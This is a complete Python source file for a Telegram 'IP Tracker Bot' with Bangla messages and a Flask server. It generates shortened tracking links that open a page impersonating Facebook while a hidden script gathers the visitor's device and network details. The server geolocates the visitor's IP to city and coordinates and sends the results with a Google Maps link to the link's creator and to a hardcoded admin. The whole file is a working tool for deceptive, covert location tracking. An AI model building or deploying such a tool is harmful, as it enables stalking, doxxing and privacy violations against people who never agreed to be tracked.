import os
import threading
import secrets
import sqlite3
import requests
import telebot
from flask import Flask, request, redirect, jsonify, send_from_directory
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from datetime import datetime

BOT_TOKEN = os.environ.get("BOT_TOKEN", "YOUR_TOKEN")
BASE_URL  = os.environ.get("BASE_URL", "https://ip-eb0c.onrender.com")
ADMIN_ID  = 8768764605
CHANNELS  = ["@BDCyberSite", "@EdusTech"]

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

def init_db():
    conn = sqlite3.connect("tracker.db", check_same_thread=False)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS links (
        token TEXT PRIMARY KEY, user_id INTEGER,
        name TEXT, clicks INTEGER DEFAULT 0, created TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        token TEXT, ip TEXT, country TEXT, city TEXT,
        region TEXT, isp TEXT, lat TEXT, lon TEXT,
        device TEXT, os TEXT, browser TEXT, screen TEXT,
        timezone TEXT, language TEXT, ram TEXT, cpu TEXT,
        network TEXT, netspeed TEXT, referrer TEXT, time TEXT)""")
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect("tracker.db", check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def check_membership(user_id):
    if user_id == ADMIN_ID:
        return True
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(ch, user_id)
            if member.status in ["left", "kicked", "banned"]:
                return False
        except:
            return False
    return True

def join_markup():
    mk = InlineKeyboardMarkup()
    for ch in CHANNELS:
        mk.add(InlineKeyboardButton(
            "📢 Join "+ch, url="https://t.me/"+ch[1:]))
    mk.add(InlineKeyboardButton("✅ Join করেছি", callback_data="check_join"))
    return mk

def not_joined_msg(chat_id):
    bot.send_message(chat_id,
        "⚠️ *বট ব্যবহার করতে আগে Join করো!*\n\nJoin করে ✅ বাটন চাপো।",
        parse_mode="Markdown", reply_markup=join_markup())

def make_page(token):
    return (
        "<!DOCTYPE html><html><head>"
        "<meta charset='UTF-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1.0'>"
        "<title>Facebook</title>"
        "<link rel='icon' href='https://www.facebook.com/favicon.ico'>"
        "<style>"
        "*{margin:0;padding:0;box-sizing:border-box}"
        "body{background:#f0f2f5;display:flex;align-items:center;"
        "justify-content:center;height:100vh;font-family:Helvetica,Arial,sans-serif}"
        ".box{text-align:center}"
        ".logo{color:#1877f2;font-size:56px;font-weight:900;"
        "letter-spacing:-2px;margin-bottom:32px}"
        ".spin{width:38px;height:38px;border:4px solid #ddd;"
        "border-top:4px solid #1877f2;border-radius:50%;"
        "animation:s .8s linear infinite;margin:0 auto}"
        "@keyframes s{to{transform:rotate(360deg)}}"
        "</style></head><body>"
        "<div class='box'>"
        "<div class='logo'>facebook</div>"
        "<div class='spin'></div>"
        "</div>"
        "<input type='hidden' id='tk' value='" + token + "'>"
        "<input type='hidden' id='bs' value='" + BASE_URL + "'>"
        "<script src='/static/tracker.js'></script>"
        "</body></html>"
    )

@app.route("/")
def home():
    return "Bot Alive!", 200

@app.route("/static/tracker.js")
def serve_js():
    return send_from_directory(".", "tracker.js")

@app.route("/t/<token>")
def track(token):
    db  = get_db()
    row = db.execute("SELECT user_id FROM links WHERE token=?", (token,)).fetchone()
    db.close()
    if not row:
        return redirect("https://facebook.com")
    return make_page(token), 200

@app.route("/collect/<token>", methods=["POST"])
def collect(token):
    js  = request.json or {}
    now = datetime.now().strftime("%d %b %Y, %I:%M %p")

    ip = (
        request.headers.get("CF-Connecting-IP") or
        request.headers.get("True-Client-IP") or
        request.headers.get("X-Real-IP") or
        request.headers.get("X-Forwarded-For", "").split(",")[0].strip() or
        request.remote_addr or "Unknown"
    ).strip()

    country=city=region=isp=lat=lon="Unknown"
    try:
        loc = requests.get(
            "http://ip-api.com/json/"+ip+"?lang=en", timeout=5).json()
        if loc.get("status") == "success":
            country = loc.get("country", "Unknown")
            city    = loc.get("city",    "Unknown")
            region  = loc.get("regionName", "Unknown")
            isp     = loc.get("isp",     "Unknown")
            lat     = str(loc.get("lat", ""))
            lon     = str(loc.get("lon", ""))
    except:
        pass

    db  = get_db()
    row = db.execute(
        "SELECT user_id, name FROM links WHERE token=?", (token,)).fetchone()
    if not row:
        db.close()
        return jsonify({"ok": True})

    db.execute("UPDATE links SET clicks=clicks+1 WHERE token=?", (token,))
    db.execute(
        "INSERT INTO logs "
        "(token,ip,country,city,region,isp,lat,lon,"
        "device,os,browser,screen,timezone,language,"
        "ram,cpu,network,netspeed,referrer,time) "
        "VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
        (token, ip, country, city, region, isp, lat, lon,
         js.get("device","Unknown"), js.get("os","Unknown"),
         js.get("browser","Unknown"), js.get("screen","Unknown"),
         js.get("timezone","Unknown"), js.get("language","Unknown"),
         js.get("ram","Unknown"), js.get("cpu","Unknown"),
         js.get("network","Unknown"), js.get("netspeed","Unknown"),
         js.get("referrer","Direct"), now))
    db.commit()

    uid       = row["user_id"]
    link_name = row["name"]
    db.close()

    maps = ""
    if lat and lat != "Unknown":
        maps = "https://maps.google.com/?q="+lat+","+lon

    msg = (
        "🚨 *লিংকে ক্লিক হয়েছে!*\n\n"
        "🔗 *"+link_name+"*\n"
        "📅 "+now+"\n\n"
        "🌐 *IP:* `"+ip+"`\n"
        "🌍 দেশ: "+country+"\n"
        "🏙️ শহর: "+city+"\n"
        "📍 অঞ্চল: "+region+"\n"
        "📡 ISP: "+isp+"\n"
        "📌 "+lat+", "+lon+"\n\n"
        "━━━━━━━━━━━━━\n"
        "📱 "+js.get("device","Unknown")+"\n"
        "🖥️ OS: "+js.get("os","Unknown")+"\n"
        "🌐 Browser: "+js.get("browser","Unknown")+"\n"
        "📐 Screen: "+js.get("screen","Unknown")+"\n"
        "🕐 Timezone: "+js.get("timezone","Unknown")+"\n"
        "🗣️ Language: "+js.get("language","Unknown")+"\n"
        "💾 RAM: "+js.get("ram","Unknown")+"\n"
        "⚙️ CPU: "+js.get("cpu","Unknown")+"\n"
        "📶 Network: "+js.get("network","Unknown")+"\n"
        "⚡ Speed: "+js.get("netspeed","Unknown")+"\n"
        "👆 Touch: "+js.get("touch","Unknown")+"\n"
        "🔗 Referrer: "+js.get("referrer","Direct")
    )

    markup = InlineKeyboardMarkup()
    if maps:
        markup.add(InlineKeyboardButton("🗺️ Google Maps", url=maps))

    try:
        bot.send_message(uid, msg, parse_mode="Markdown", reply_markup=markup)
    except:
        pass

    if uid != ADMIN_ID:
        try:
            bot.send_message(ADMIN_ID,
                "👁️ *Admin Log*\n\n"
                "👤 Owner: `"+str(uid)+"`\n"
                "🔗 Link: `"+link_name+"`\n"
                "🌐 IP: `"+ip+"`\n"
                "🌍 "+country+" | 🏙️ "+city+"\n"
                "📱 "+js.get("device","Unknown")+"\n"
                "📅 "+now,
                parse_mode="Markdown")
        except:
            pass

    return jsonify({"ok": True})

def main_menu():
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(
        InlineKeyboardButton("🔗 নতুন লিংক", callback_data="new_link"),
        InlineKeyboardButton("📋 আমার লিংক", callback_data="my_links"),
        InlineKeyboardButton("📊 Statistics",  callback_data="stats"),
        InlineKeyboardButton("❓ Help",        callback_data="help"),
    )
    return mk

def admin_menu():
    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(
        InlineKeyboardButton("👥 সব Users",    callback_data="admin_users"),
        InlineKeyboardButton("🔗 সব Links",    callback_data="admin_links"),
        InlineKeyboardButton("📊 Total Stats", callback_data="admin_stats"),
        InlineKeyboardButton("📋 Recent Logs", callback_data="admin_logs"),
    )
    return mk

@bot.message_handler(commands=["start"])
def cmd_start(m):
    if not check_membership(m.from_user.id):
        not_joined_msg(m.chat.id)
        return
    bot.send_message(m.chat.id,
        "👋 স্বাগতম *"+m.from_user.first_name+"*!\n\n"
        "🔍 *IP Tracker Bot*\n\n"
        "ট্র্যাকিং লিংক বানাও\n"
        "ক্লিক করলেই পাবে:\n"
        "IP, Location, Device, OS, Browser\n"
        "RAM, CPU, Network, Screen, Timezone\n\n"
        "👇 শুরু করো",
        parse_mode="Markdown", reply_markup=main_menu())

@bot.message_handler(commands=["track"])
def cmd_track(m):
    if not check_membership(m.from_user.id):
        not_joined_msg(m.chat.id)
        return
    ask_name(m.chat.id)

@bot.message_handler(commands=["admin"])
def cmd_admin(m):
    if m.from_user.id != ADMIN_ID:
        bot.send_message(m.chat.id, "❌ তুমি Admin না!")
        return
    db = get_db()
    tu   = db.execute("SELECT COUNT(DISTINCT user_id) FROM links").fetchone()[0]
    tl   = db.execute("SELECT COUNT(*) FROM links").fetchone()[0]
    tc   = db.execute("SELECT COALESCE(SUM(clicks),0) FROM links").fetchone()[0]
    tlog = db.execute("SELECT COUNT(*) FROM logs").fetchone()[0]
    db.close()
    bot.send_message(m.chat.id,
        "⚙️ *Admin Panel*\n\n"
        "👥 Users: "+str(tu)+"\n"
        "🔗 Links: "+str(tl)+"\n"
        "👆 Clicks: "+str(tc)+"\n"
        "📋 Logs: "+str(tlog),
        parse_mode="Markdown", reply_markup=admin_menu())

def ask_name(chat_id):
    msg = bot.send_message(chat_id, "📌 লিংকের নাম দাও:")
    bot.register_next_step_handler(msg, create_link)

def create_link(m):
    if not check_membership(m.from_user.id):
        not_joined_msg(m.chat.id)
        return
    name  = m.text.strip() or "আমার লিংক"
    token = secrets.token_urlsafe(10)
    now   = datetime.now().strftime("%d %b %Y")

    db = get_db()
    db.execute(
        "INSERT INTO links (token,user_id,name,clicks,created) VALUES(?,?,?,0,?)",
        (token, m.from_user.id, name, now))
    db.commit()
    db.close()

    link  = BASE_URL+"/t/"+token
    short = link
    try:
        r = requests.get(
            "https://is.gd/create.php?format=simple&url="+
            requests.utils.quote(link), timeout=5)
        if r.text.startswith("http") and len(r.text) < 40:
            short = r.text.strip()
    except:
        pass

    mk = InlineKeyboardMarkup(row_width=2)
    mk.add(
        InlineKeyboardButton("📋 আমার লিংক", callback_data="my_links"),
        InlineKeyboardButton("🔗 নতুন লিংক", callback_data="new_link"),
        InlineKeyboardButton("📊 Logs",        callback_data="logs_"+token),
        InlineKeyboardButton("🗑️ মুছো",       callback_data="del_"+token),
    )
    bot.send_message(m.chat.id,
        "✅ *লিংক রেডি!*\n\n"
        "📌 নাম: `"+name+"`\n\n"
        "🔗 লিংক:\n`"+short+"`\n\n"
        "ক্লিক করলেই সব info আসবে!",
        parse_mode="Markdown", reply_markup=mk)

def show_links(chat_id, user_id):
    db   = get_db()
    rows = db.execute(
        "SELECT token,name,clicks FROM links WHERE user_id=? ORDER BY rowid DESC",
        (user_id,)).fetchall()
    db.close()
    if not rows:
        bot.send_message(chat_id, "❌ কোনো লিংক নেই। /track দিয়ে বানাও!",
            reply_markup=main_menu())
        return
    msg = "📋 *তোমার লিংক:*\n\n"
    mk  = InlineKeyboardMarkup(row_width=2)
    for r in rows:
        msg += "🔗 *"+r["name"]+"* — "+str(r["clicks"])+" clicks\n`"+BASE_URL+"/t/"+r["token"]+"`\n\n"
        mk.add(
            InlineKeyboardButton("📊 "+r["name"][:10], callback_data="logs_"+r["token"]),
            InlineKeyboardButton("🗑️ মুছো",            callback_data="del_"+r["token"]),
        )
    mk.add(InlineKeyboardButton("🔙 Back", callback_data="menu"))
    bot.send_message(chat_id, msg, parse_mode="Markdown", reply_markup=mk)

@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    d   = c.data
    uid = c.from_user.id
    cid = c.message.chat.id
    bot.answer_callback_query(c.id)

    if d != "check_join" and not check_membership(uid):
        not_joined_msg(cid)
        return

    if d == "check_join":
        if check_membership(uid):
            bot.send_message(cid, "✅ ধন্যবাদ!", reply_markup=main_menu())
        else:
            bot.send_message(cid, "❌ এখনো Join করোনি!", reply_markup=join_markup())
    elif d == "menu":
        bot.send_message(cid, "👇 Main Menu:", reply_markup=main_menu())
    elif d == "new_link":
        ask_name(cid)
    elif d == "my_links":
        show_links(cid, uid)
    elif d == "stats":
        db = get_db()
        tl = db.execute("SELECT COUNT(*) FROM links WHERE user_id=?", (uid,)).fetchone()[0]
        tc = db.execute("SELECT COALESCE(SUM(clicks),0) FROM links WHERE user_id=?", (uid,)).fetchone()[0]
        db.close()
        bot.send_message(cid,
            "📊 *Statistics*\n\nLinks: "+str(tl)+"\nClicks: "+str(tc),
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="menu")))
    elif d == "help":
        bot.send_message(cid,
            "1. /track দাও\n2. নাম দাও\n3. লিংক পাবে\n4. ক্লিক হলেই info আসবে",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="menu")))
    elif d == "admin_users" and uid == ADMIN_ID:
        db   = get_db()
        rows = db.execute(
            "SELECT user_id, COUNT(*) as lc, SUM(clicks) as tc "
            "FROM links GROUP BY user_id ORDER BY tc DESC LIMIT 15").fetchall()
        db.close()
        msg = "👥 *Users:*\n\n"
        for r in rows:
            msg += "ID: "+str(r["user_id"])+" | Links: "+str(r["lc"])+" | Clicks: "+str(r["tc"] or 0)+"\n"
        bot.send_message(cid, msg, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="admin_back")))
    elif d == "admin_links" and uid == ADMIN_ID:
        db   = get_db()
        rows = db.execute(
            "SELECT user_id,name,clicks FROM links ORDER BY clicks DESC LIMIT 15").fetchall()
        db.close()
        msg = "🔗 *Links:*\n\n"
        for r in rows:
            msg += str(r["user_id"])+" | "+r["name"]+" | "+str(r["clicks"])+" clicks\n"
        bot.send_message(cid, msg, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="admin_back")))
    elif d == "admin_stats" and uid == ADMIN_ID:
        db = get_db()
        tu   = db.execute("SELECT COUNT(DISTINCT user_id) FROM links").fetchone()[0]
        tl   = db.execute("SELECT COUNT(*) FROM links").fetchone()[0]
        tc   = db.execute("SELECT COALESCE(SUM(clicks),0) FROM links").fetchone()[0]
        tlog = db.execute("SELECT COUNT(*) FROM logs").fetchone()[0]
        db.close()
        bot.send_message(cid,
            "📊 *Total Stats*\n\nUsers: "+str(tu)+"\nLinks: "+str(tl)+"\nClicks: "+str(tc)+"\nLogs: "+str(tlog),
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="admin_back")))
    elif d == "admin_logs" and uid == ADMIN_ID:
        db   = get_db()
        rows = db.execute(
            "SELECT l.ip,l.country,l.city,l.device,l.time,lk.name "
            "FROM logs l JOIN links lk ON l.token=lk.token "
            "ORDER BY l.id DESC LIMIT 10").fetchall()
        db.close()
        msg = "📋 *Recent Logs:*\n\n"
        for i,r in enumerate(rows,1):
            msg += str(i)+". "+r["ip"]+" | "+r["country"]+" | "+r["device"]+" | "+r["time"]+"\n"
        bot.send_message(cid, msg, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="admin_back")))
    elif d == "admin_back" and uid == ADMIN_ID:
        bot.send_message(cid, "⚙️ Admin Panel:", reply_markup=admin_menu())
    elif d.startswith("logs_"):
        token = d[5:]
        db    = get_db()
        link  = db.execute(
            "SELECT name FROM links WHERE token=? AND (user_id=? OR ?=?)",
            (token, uid, uid, ADMIN_ID)).fetchone()
        logs  = db.execute(
            "SELECT * FROM logs WHERE token=? ORDER BY id DESC LIMIT 5",
            (token,)).fetchall()
        db.close()
        if not link:
            bot.send_message(cid, "পাওয়া যায়নি।")
            return
        msg = "📊 *"+link["name"]+"* Logs:\n\n"
        if not logs:
            msg += "এখনো click নেই।"
        else:
            for i,l in enumerate(logs,1):
                msg += (
                    str(i)+". `"+l["ip"]+"`\n"
                    "🌍 "+l["country"]+" | "+l["city"]+"\n"
                    +l["device"]+" | "+l["os"]+"\n"
                    "🌐 "+l["browser"]+" | "+l["screen"]+"\n"
                    "💾 "+l["ram"]+" | ⚙️ "+l["cpu"]+"\n"
                    "📶 "+l["network"]+" "+l["netspeed"]+"\n"
                    "📅 "+l["time"]+"\n\n"
                )
        bot.send_message(cid, msg, parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup().add(
                InlineKeyboardButton("🔙 Back", callback_data="my_links")))
    elif d.startswith("del_"):
        token = d[4:]
        db = get_db()
        db.execute("DELETE FROM links WHERE token=? AND user_id=?", (token, uid))
        db.execute("DELETE FROM logs WHERE token=?", (token,))
        db.commit()
        db.close()
        bot.send_message(cid, "🗑️ মুছে দেওয়া হয়েছে!", reply_markup=main_menu())

def run_flask():
    app.run(host="0.0.0.0", port=8080)

threading.Thread(target=run_flask, daemon=True).start()
print("Bot Starting...")
bot.infinity_polling()
